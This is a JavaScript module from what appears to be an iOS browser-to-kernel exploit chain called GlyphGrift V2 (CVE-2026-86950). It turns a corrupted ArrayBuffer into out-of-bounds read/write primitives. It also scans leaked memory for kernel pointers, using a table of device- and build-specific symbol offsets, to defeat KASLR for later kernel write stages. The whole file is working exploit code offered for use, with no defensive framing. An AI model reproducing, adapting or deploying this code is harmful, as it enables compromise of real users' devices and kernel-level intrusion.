/**
 * CVE-2026-86950 GlyphGrift V2 — Kernel R/W primitive from corrupted ArrayBuffer.
 * Converts the OOB write primitive into a relative read/write API for userspace heap access.
 * When combined with kernel pointer leak detection, provides KASLR defeat and kernel virtual R/W.
 * 
 * Usage:
 *   1. Load after glyphgrift_post_trigger.js detects corruption
 *   2. Call GlyphGriftKRW.init(corruptedBuffer, originalLength)
 *   3. Use GlyphGriftKRW.read64(offset) / write64(offset, value) for relative access
 *   4. Call GlyphGriftKRW.scanForKernelPointer() to leak kbase
 */
(function() {
  'use strict';
  
  var gCorruptedBuffer = null;
  var gOriginalLength = 0;
  var gHeapBase = 0n;
  var gKbase = 0n;
  var gKaslrSlide = 0n;
  var gInitialized = false;
  
  /* iOS kernel pointer constants */
  var KERNEL_BASE = 0xfffffff000000000n;
  var KERNEL_MASK = 0xfffffff000000000n;
  /*
   * KASLR "slide" bounds for a derived kbase, measured as (kbase - KERNEL_BASE).
   * The unslid T8140 kernel image base is 0xfffffff007004000 (see
   * include/exploits/kernel_offsets.h KOFF_KERNEL_BASE_SLIDE_HINT), so a genuine
   * kbase sits at 0x07004000 + kslide. Keep the window around that to reject
   * false positives that merely match the 0xfffffff0xxxx nibble.
   */
  var KERNEL_MIN_SLIDE = 0x06000000n;
  var KERNEL_MAX_SLIDE = 0x18000000n;

   /*
   * Known kernel symbol offsets FROM THE UNSLID SLIDE HINT base
   *   offset = KOFF_<sym> - KOFF_KERNEL_BASE_SLIDE_HINT  (= 0xfffffff007004000)
   *
   * Source of truth: include/exploits/kernel_offsets.h (xpf-cli verified) and
   * OFFSETS/t8140-26.6.1-23G83/RECOVERY_REPORT.md.
   *
   * Why this exact base: the C side computes kslide = kbase - 0xfffffff007004000
   * (see bypass_chain.c, KOFF_KERNEL_BASE_SLIDE_HINT) and resolves symbols as
   * KOFF_<sym> + kslide. For that to hit the real runtime symbol address
   * L(sym) = KOFF_<sym> + kslide_true, the JS-derived kbase must equal
   * 0xfffffff007004000 + kslide_true. Since kbase = ptr - offset, we need
   * offset = KOFF_<sym> - 0xfffffff007004000.
   *
   * BUG FIX (D2, round 2): the previous table mixed TWO bases — 9 symbols were
   * relative to 0xfffffff007000000 and 2 (allproc, load_static_trust_cache) to
   * 0xfffffff000000000 — and NEITHER matched the C convention. Two consequences:
   *   (1) a real leak gave a kbase that was off by 0x00004000 (B7 group) or
   *       0x07000000 (B0 group), so Stage-7 kwrite64 hit the wrong address;
   *   (2) the multi-anchor cross-check could never reach HIGH confidence because
   *       pointers to different symbols derived DIFFERENT kbases instead of
   *       converging. Regenerated so every offset shares one consistent base.
   */
  var KERNEL_ANCHORS = [
    { offset: 0x00cb4c78n, name: 'gVirtBase' },
    { offset: 0x00ce92e0n, name: 'gPhysBase' },
    { offset: 0x00ce92e8n, name: 'gPhysSize' },
    { offset: 0x00d2c900n, name: 'ptov_table' },
    { offset: 0x00cd6b20n, name: 'trust_cache_rt' },
    { offset: 0x03be0888n, name: 'load_static_trust_cache' },
    { offset: 0x04236880n, name: 'allproc' },
    { offset: 0x00cb4c50n, name: 'vm_first_phys' },
    { offset: 0x00cb4c58n, name: 'vm_last_phys' },
    { offset: 0x00c92e18n, name: 'pv_head_table' },
    { offset: 0x00c92e10n, name: 'pp_attr_table' }
  ];
  
  /**
   * Initialize the relative R/W primitive from a corrupted ArrayBuffer.
   * @param {ArrayBuffer} corruptedBuffer - The ArrayBuffer with corrupted byteLength
   * @param {number} originalLength - The expected (original) byteLength before corruption
   */
  function init(corruptedBuffer, originalLength) {
    if (!corruptedBuffer || typeof originalLength !== 'number' || originalLength <= 0) {
      log('init failed: invalid parameters');
      return false;
    }
    
    gCorruptedBuffer = corruptedBuffer;
    gOriginalLength = originalLength;
    gInitialized = true;
    
    /* Estimate heap base from buffer position */
    gHeapBase = estimateHeapBase();
    
    log('GlyphGriftKRW initialized: originalLen=' + originalLength +
        ', actualLen=' + corruptedBuffer.byteLength +
        ', heapBase=0x' + gHeapBase.toString(16));
    
    return true;
  }
  
  /**
   * Estimate the heap base address from spray position.
   * This is approximate - actual address depends on bmalloc zone geometry.
   */
  function estimateHeapBase() {
    /* 
     * bmalloc/libpas heap on iOS typically starts around 0x280000000-0x300000000
     * The spray buffers are allocated sequentially, so we can estimate based on
     * spray index and zone size.
     * 
     * For now, return a placeholder - will be refined with actual heap leaks.
     */
    return 0x280000000n;
  }
  
  /**
   * Read a 32-bit value at offset relative to the corrupted buffer's base.
   * @param {number} offset - Offset from buffer start (can be beyond original length)
   * @returns {number|null} The read value, or null on access violation
   */
  function read32(offset) {
    if (!gInitialized || !gCorruptedBuffer) {
      return null;
    }
    
    var view = new DataView(gCorruptedBuffer);
    try {
      return view.getUint32(offset, true);  /* Little-endian */
    } catch (e) {
      log('read32 failed at offset ' + offset + ': ' + e.message);
      return null;
    }
  }
  
  /**
   * Write a 32-bit value at offset relative to the corrupted buffer's base.
   * @param {number} offset - Offset from buffer start
   * @param {number} value - Value to write
   * @returns {boolean} True on success, false on access violation
   */
  function write32(offset, value) {
    if (!gInitialized || !gCorruptedBuffer) {
      return false;
    }
    
    var view = new DataView(gCorruptedBuffer);
    try {
      view.setUint32(offset, value, true);
      return true;
    } catch (e) {
      log('write32 failed at offset ' + offset + ': ' + e.message);
      return false;
    }
  }
  
  /**
   * Read a 64-bit value at offset relative to the corrupted buffer's base.
   * @param {number} offset - Offset from buffer start
   * @returns {BigInt|null} The read value as BigInt, or null on access violation
   */
  function read64(offset) {
    var lo = read32(offset);
    var hi = read32(offset + 4);
    
    if (lo === null || hi === null) {
      return null;
    }
    
    return (BigInt(hi) << BigInt(32)) | BigInt(lo);
  }
  
  /**
   * Write a 64-bit value at offset relative to the corrupted buffer's base.
   * @param {number} offset - Offset from buffer start
   * @param {BigInt} value - Value to write as BigInt
   * @returns {boolean} True on success, false on access violation
   */
  function write64(offset, value) {
    if (typeof value !== 'bigint') {
      value = BigInt(value);
    }
    
    var lo = Number(value & BigInt(0xFFFFFFFF));
    var hi = Number((value >> BigInt(32)) & BigInt(0xFFFFFFFF));
    
    var ok1 = write32(offset, lo);
    var ok2 = write32(offset + 4, hi);
    
    return ok1 && ok2;
  }
  
  /**
   * Read bytes from the corrupted buffer.
   * @param {number} offset - Offset from buffer start
   * @param {number} length - Number of bytes to read
   * @returns {Uint8Array|null} The read bytes, or null on failure
   */
  function readBytes(offset, length) {
    if (!gInitialized || !gCorruptedBuffer) {
      return null;
    }
    
    try {
      var u8 = new Uint8Array(gCorruptedBuffer, offset, length);
      var result = new Uint8Array(length);
      for (var i = 0; i < length; i++) {
        result[i] = u8[i];
      }
      return result;
    } catch (e) {
      log('readBytes failed: ' + e.message);
      return null;
    }
  }
  
  /**
   * Write bytes to the corrupted buffer.
   * @param {number} offset - Offset from buffer start
   * @param {Uint8Array} data - Bytes to write
   * @returns {boolean} True on success, false on failure
   */
  function writeBytes(offset, data) {
    if (!gInitialized || !gCorruptedBuffer) {
      return false;
    }
    
    try {
      var u8 = new Uint8Array(gCorruptedBuffer, offset, data.length);
      for (var i = 0; i < data.length; i++) {
        u8[i] = data[i];
      }
      return true;
    } catch (e) {
      log('writeBytes failed: ' + e.message);
      return false;
    }
  }
  
  /**
   * Scan the OOB-readable region for kernel pointers.
   * Kernel pointers on iOS are in the 0xfffffff0xxxxx000 range.
   * @returns {Object|null} Object with {offset, pointer, kbase, symbol} or null if none found
   */
  function scanForKernelPointer() {
    if (!gInitialized) {
      return null;
    }

    log('Scanning for kernel pointers (offset ' + gOriginalLength + ' to ' + (gOriginalLength + 0x200) + ')...');

    /*
     * Collect every (pointer, anchor) pair whose derived kbase is plausible.
     * We do NOT trust the first hit: a single anchor match can be a plausible-
     * but-wrong kbase (the D2 failure mode). We return a result only when >= 2
     * distinct anchors independently derive the SAME kbase; otherwise we report
     * the single-anchor candidate with confidence 'LOW' so the host can decide,
     * but never mark it as a trusted kbase.
     */
    var candidates = {};   /* kbaseHex -> { count, symbols: [], offset, pointer } */

    for (var offset = gOriginalLength; offset < gOriginalLength + 0x200; offset += 8) {
      var ptr = read64(offset);
      if (ptr === null) continue;
      if ((ptr & KERNEL_MASK) !== KERNEL_BASE) continue;

      for (var i = 0; i < KERNEL_ANCHORS.length; i++) {
        var anchor = KERNEL_ANCHORS[i];
        var kbase = ptr - anchor.offset;
        var slide = kbase - KERNEL_BASE;
        if (slide < KERNEL_MIN_SLIDE || slide > KERNEL_MAX_SLIDE) continue;

        var key = kbase.toString(16);
        if (!candidates[key]) {
          candidates[key] = { kbase: kbase, slide: slide, count: 0, symbols: [], offset: offset, pointer: ptr };
        }
        candidates[key].count++;
        candidates[key].symbols.push(anchor.name);
      }
    }

    var best = null;
    for (var k in candidates) {
      if (!best || candidates[k].count > best.count) best = candidates[k];
    }

    if (best && best.count >= 2) {
      var result = {
        offset: best.offset,
        pointer: best.pointer,
        kbase: best.kbase,
        kaslr_slide: best.slide,
        symbol: best.symbols.join('+'),
        confidence: 'HIGH',
        anchors: best.count
      };
      log('Kernel kbase cross-confirmed by ' + best.count + ' anchors (' + best.symbols.join(', ') +
          '): kbase=0x' + best.kbase.toString(16) + ' (slide=0x' + best.slide.toString(16) + ')');
      gKbase = best.kbase;
      gKaslrSlide = best.slide;
      return result;
    }

    if (best && best.count === 1) {
      log('SINGLE-ANCHOR kbase candidate (UNTRUSTED): ' + best.symbols[0] +
          ' -> kbase=0x' + best.kbase.toString(16) + ' (slide=0x' + best.slide.toString(16) + ')');
      /* Expose for diagnostics but do NOT adopt as gKbase. */
      return {
        offset: best.offset,
        pointer: best.pointer,
        kbase: best.kbase,
        kaslr_slide: best.slide,
        symbol: best.symbols[0],
        confidence: 'LOW',
        anchors: 1
      };
    }

    log('No kernel pointers found in scan region');
    return null;
  }
  
  /**
   * Derive kbase from a leaked kernel pointer.
   * @param {BigInt} leakedPtr - The leaked kernel pointer
   * @returns {Object|null} Object with {kbase, kaslr_slide, symbol} or null
   */
  function deriveKbase(leakedPtr) {
    for (var i = 0; i < KERNEL_ANCHORS.length; i++) {
      var anchor = KERNEL_ANCHORS[i];
      var kbase = leakedPtr - anchor.offset;
      var slide = kbase - KERNEL_BASE;
      
      if (slide >= KERNEL_MIN_SLIDE && slide <= KERNEL_MAX_SLIDE) {
        return {
          kbase: kbase,
          kaslr_slide: slide,
          symbol: anchor.name
        };
      }
    }
    return null;
  }
  
  /**
   * Check if a value looks like a valid kernel pointer.
   */
  function isValidKernelPointer(ptr) {
    if (typeof ptr !== 'bigint') {
      ptr = BigInt(ptr);
    }
    return (ptr & KERNEL_MASK) === KERNEL_BASE;
  }
  
  /**
   * Get the current state of the KRW primitive.
   */
  function getState() {
    return {
      initialized: gInitialized,
      corrupted: !!gCorruptedBuffer,
      originalLength: gOriginalLength,
      actualLength: gCorruptedBuffer ? gCorruptedBuffer.byteLength : 0,
      heapBase: gHeapBase,
      kbase: gKbase,
      kaslrSlide: gKaslrSlide,
      hasKrw: gInitialized && gCorruptedBuffer && gCorruptedBuffer.byteLength > gOriginalLength
    };
  }
  
  /**
   * Internal logging function.
   */
  function log(msg) {
    if (typeof window !== 'undefined' && window.console) {
      console.log('[GlyphGriftKRW] ' + msg);
    }
  }
  
  /* Export public API to window */
  window.GlyphGriftKRW = {
    init: init,
    read32: read32,
    write32: write32,
    read64: read64,
    write64: write64,
    readBytes: readBytes,
    writeBytes: writeBytes,
    scanForKernelPointer: scanForKernelPointer,
    deriveKbase: deriveKbase,
    getState: getState,
    isValidKernelPointer: isValidKernelPointer,
    
    /* Direct access to internals for debugging */
    _getCorruptedBuffer: function() { return gCorruptedBuffer; },
    _getHeapBase: function() { return gHeapBase; },
    _getKbase: function() { return gKbase; }
  };
  
  log('GlyphGriftKRW module loaded');
})();